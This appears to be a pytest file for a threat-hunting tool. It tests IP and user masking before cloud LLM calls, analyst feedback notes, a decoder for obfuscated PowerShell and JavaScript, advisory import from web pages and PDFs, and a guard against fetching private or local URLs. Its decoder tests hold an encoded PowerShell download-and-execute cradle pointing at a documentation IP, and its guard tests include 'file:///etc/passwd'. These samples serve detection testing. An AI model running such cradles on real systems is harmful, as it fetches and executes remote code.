import base64
import gzip
import io
import json

import pytest

from actaeon import config
from actaeon.decode import decode
from actaeon.hunt import service
from actaeon.intel.fetch import FetchError, _check_host, fetch_url, html_to_text, read_file
from actaeon.privacy import Masker, PrivacyLLM
from actaeon.providers.base import LLMResult
from tests.conftest import write_cfg
from tests.test_hunt import LLM, PLAN, Hub, call


# ---- privacy ----
def test_masker_round_trip():
    m = Masker(terms=["Example Corp"], patterns=[r"\bWS-\d{4}\b"])
    text = ('alice@example.org logged in from 10.1.2.3 to WS-1234 at Example Corp; "user": "bob", '
            'UserName=carol and 10.1.2.3 again; user: SYSTEM; machine$ ok')
    masked = m.mask(text)
    for real in ("alice@example.org", "10.1.2.3", "WS-1234", "Example Corp", "bob", "carol"):
        assert real not in masked
    assert masked.count("IP_1") == 2 and "SYSTEM" in masked
    assert m.unmask(masked) == text


def test_masker_skips_loopback_and_public_if_asked():
    m = Masker(keep_public_ips=True)
    assert m.mask("127.0.0.1 8.8.8.8 10.0.0.5") == "127.0.0.1 8.8.8.8 IP_1"


class Provider:
    def __init__(self, name):
        self.name = name


class Bound:
    def __init__(self, name, reply):
        self.provider, self.model, self.reply, self.seen = Provider(name), "m", reply, []

    def chat(self, messages, **kw):
        self.seen.append(messages)
        return LLMResult(text=self.reply)


class TwoRoles:
    def __init__(self, cloud, local):
        self.b = {"cloud": cloud, "local": local}

    def for_role(self, r):
        return self.b[r]


def test_privacy_llm_masks_only_cloud():
    cloud = Bound("anthropic", '{"action":"call","arguments":{"query":"src:IP_1 OR user:USER_1"}}')
    local = Bound("ollama", "ok")
    p = PrivacyLLM(TwoRoles(cloud, local))
    out = p.for_role("cloud").chat([{"role": "user", "content": "host 10.9.9.9 user=dave"}])
    assert cloud.seen[0][0]["content"] == "host IP_1 user=USER_1"
    assert "10.9.9.9" in out.text and "dave" in out.text
    p.for_role("local").chat([{"role": "user", "content": "host 10.9.9.9"}])
    assert local.seen[0][0]["content"] == "host 10.9.9.9"
    # masking off: only the secret filter stays (it applies to every provider); turned off too, the model is as is
    assert PrivacyLLM(TwoRoles(cloud, local), {"mask_for": [], "strip_secrets": False}).for_role("cloud") is cloud
    assert PrivacyLLM(TwoRoles(cloud, local), {"mask_for": []}).for_role("cloud")._b is cloud


def test_privacy_config_validation(home):
    write_cfg(home, lambda d: d.update(privacy={"types": ["email", "dna"]}))
    with pytest.raises(ValueError):
        config.load_config()


def test_hunt_records_masking(home):
    cfg = config.get_config(reload=True)

    class CloudLLM(LLM):
        def for_role(self, role):
            b = self.roles[role]
            b.provider.name = "gemini"
            return b
    llm = CloudLLM(PLAN, [call(index="e", time_from="now-1d", query="src:IP_1"),
                          {"action": "verdict", "outcome": "no_results", "summary": "nothing from IP_1"}])
    hub = Hub()
    h = service.run_hunt(cfg, "connections from 10.20.30.40", llm=llm, hub=hub)
    assert hub.calls[0][2]["query"] == "src:10.20.30.40"          # real value reached the tool
    assert "10.20.30.40" not in json.dumps(llm.roles["analyst"].seen)  # never in a prompt
    assert h["verdict"]["summary"] == "nothing from 10.20.30.40"
    assert any("privacy: masked" in (s["note"] or "") for s in h["steps"])


# ---- environment profile ----
def test_environment_context(home):
    write_cfg(home, lambda d: d.update(environment={"summary": "Windows shop", "not_present": ["macOS"],
                                                    "crown_jewels": ["payroll db"]}))
    cfg = config.load_config()
    ctx = service.environment_context(cfg)
    assert "Windows shop" in ctx and "do not hunt for these): macOS" in ctx and "payroll db" in ctx
    llm = LLM(PLAN, [{"action": "verdict", "outcome": "inconclusive", "summary": "x"}])
    service.run_hunt(cfg, "x", llm=llm, hub=Hub())
    assert "Windows shop" in llm.roles["analyst"].seen[0][1]["content"]
    write_cfg(home, lambda d: d.update(environment=["bad"]))
    with pytest.raises(ValueError):
        config.load_config()


# ---- feedback ----
def test_feedback_creates_memory_note(home):
    from actaeon.hunt import HuntEngine
    cfg = config.get_config(reload=True)
    eng = HuntEngine(LLM(PLAN, [call(index="e", time_from="now-1d"), call(index="e", time_from="now-2d"),
                                call("lookup", value="1.2.3.4"),
                                {"action": "verdict", "outcome": "threat", "summary": "s",
                                 "findings": [{"claim": "backup01 ran rclone to cloud storage", "evidence": ["E2"]}]}]),
                     Hub(), service.store_for(cfg))
    h = eng.run("exfil to cloud storage")
    from actaeon.web import create_app
    c = create_app(cfg).test_client()
    r = c.post(f"/api/hunts/{h['id']}/feedback", json={"finding": 0, "kind": "benign", "comment": "nightly backup"}).json
    assert r["note"]["tags"] == ["benign", f"hunt:{h['id']}"]
    assert c.get(f"/api/hunts/{h['id']}").json["feedback"][0]["kind"] == "benign"
    assert "nightly backup" in service.memory_for(cfg).context("rclone cloud storage upload")
    assert c.post(f"/api/hunts/{h['id']}/feedback", json={"finding": 5, "kind": "benign"}).status_code == 400
    assert c.post(f"/api/hunts/{h['id']}/feedback", json={"finding": 0, "kind": "meh"}).status_code == 400
    assert c.post("/api/hunts/nope/feedback", json={"finding": 0, "kind": "benign"}).status_code == 404
    r = c.post(f"/api/hunts/{h['id']}/feedback", json={"finding": 0, "kind": "confirmed"}).json
    assert r["note"] is None


# ---- decoder ----
def test_decode_layers():
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1')"
    enc = base64.b64encode(ps.encode("utf-16-le")).decode()
    r = decode(f"powershell -nop -w hidden -enc {enc}")
    assert r["final"] == ps and "downloadstring" in r["keywords"] and r["ips"] == ["198.51.100.5"]
    inner = base64.b64encode(gzip.compress(b"Invoke-Expression whoami")).decode()
    outer = base64.b64encode(f"FromBase64String('{inner}')".encode("utf-16-le")).decode()
    r = decode(f"powershell -EncodedCommand {outer}")
    assert r["final"] == "Invoke-Expression whoami" and len(r["layers"]) == 2
    assert decode("[char]105+[char]101+[char]120+[char]32")["final"] == "iex "
    assert decode("String.fromCharCode(97,108,101,114,116)")["final"] == "alert"
    assert any(la["decoded"] == "DownloadString" for la in decode("('Down'+'load'+'String')")["layers"])
    assert decode("i`e`x")["final"] == "iex"
    assert decode("plain text")["layers"] == []


def test_decode_tool_over_mcp():
    from actaeon.bridges.local_tools import build
    from actaeon.connectors.policy import looks_write
    srv = build()
    assert not looks_write(srv.tools["decode_command"].describe())
    r = srv.handle({"id": 1, "method": "tools/call", "params": {"name": "decode_command",
                                                                "arguments": {"text": "i`e`x"}}})
    assert r["result"]["structuredContent"]["final"] == "iex"


def test_local_tools_is_analysis_not_data(home):
    from actaeon.connectors import get_hub
    hub = get_hub(config.get_config(reload=True))
    assert hub.specs["local-tools"].roles == ["analysis"]
    llm = LLM(PLAN, [{"action": "call", "connector": "local-tools", "tool": "decode_command",
                      "arguments": {"text": "i`e`x"}},
                     {"action": "verdict", "outcome": "no_results", "summary": "x"}])
    h = service.run_hunt(config.get_config(), "x", llm=llm, hub=hub)
    assert h["steps"][1]["ok"] and h["verdict"]["outcome"] == "logs_missing"


# ---- advisory import ----
def test_html_to_text():
    title, text = html_to_text("<html><head><title>Adv 1</title><script>evil()</script></head>"
                               "<body><nav>menu</nav><p>C2 at hxxp://bad[.]example</p><p>T1105</p></body></html>")
    assert title == "Adv 1" and "evil" not in text and "menu" not in text and "bad[.]example" in text


def _pdf_bytes(text):
    from pypdf import PdfWriter
    from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject
    w = PdfWriter()
    page = w.add_blank_page(width=300, height=300)
    font = DictionaryObject({NameObject("/Type"): NameObject("/Font"), NameObject("/Subtype"): NameObject("/Type1"),
                             NameObject("/BaseFont"): NameObject("/Helvetica")})
    page[NameObject("/Resources")] = DictionaryObject({NameObject("/Font"): DictionaryObject({NameObject("/F1"): font})})
    s = DecodedStreamObject()
    s.set_data(f"BT /F1 10 Tf 20 200 Td ({text}) Tj ET".encode())
    page[NameObject("/Contents")] = w._add_object(s)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def test_pdf_file_import(tmp_path):
    p = tmp_path / "adv.pdf"
    p.write_bytes(_pdf_bytes("Beacon to 203.0.113.44 using T1071.001"))
    doc = read_file(str(p))
    assert "203.0.113.44" in doc["text"]


def test_url_guard():
    with pytest.raises(FetchError):
        _check_host("file:///etc/passwd", False)
    with pytest.raises(FetchError):
        _check_host("http://127.0.0.1/x", False)
    with pytest.raises(FetchError):
        _check_host("http://10.0.0.1/x", False)
    _check_host("http://10.0.0.1/x", True)


def test_redirect_to_private_is_refused(monkeypatch):
    import actaeon.intel.fetch as f
    monkeypatch.setattr(f, "_check_host", lambda url, allow: (_ for _ in ()).throw(FetchError("private"))
                        if "10.0.0.9" in url else None)

    class R:
        def __init__(self, status, loc=None):
            self.status_code, self.headers = status, ({"Location": loc} if loc else {})

        def close(self):
            pass

    class S:
        def get(self, url, **kw):
            return R(302, "http://10.0.0.9/internal")
    with pytest.raises(FetchError):
        fetch_url("https://public.example/adv", session=S())


def test_import_api(home, monkeypatch):
    import actaeon.intel.fetch as f
    from actaeon.web import create_app
    monkeypatch.setattr(f, "fetch_url", lambda url, **kw: {"url": url, "title": "Web adv",
                                                         "text": "C2 hxxp://evil[.]example 198.51.100.8"})
    c = create_app(config.get_config(reload=True)).test_client()
    r = c.post("/api/intel/advisories/import", json={"url": "https://x.example/a"}).json
    assert r["title"] == "Web adv" and r["new"] >= 2
    data = {"file": (io.BytesIO(_pdf_bytes("Uses 203.0.113.50 T1105")), "adv.pdf")}
    r = c.post("/api/intel/advisories/import", data=data, content_type="multipart/form-data").json
    assert r["new"] >= 1 and r["title"] == "adv.pdf"
    assert c.post("/api/decode", json={"text": "i`e`x"}).json["final"] == "iex"
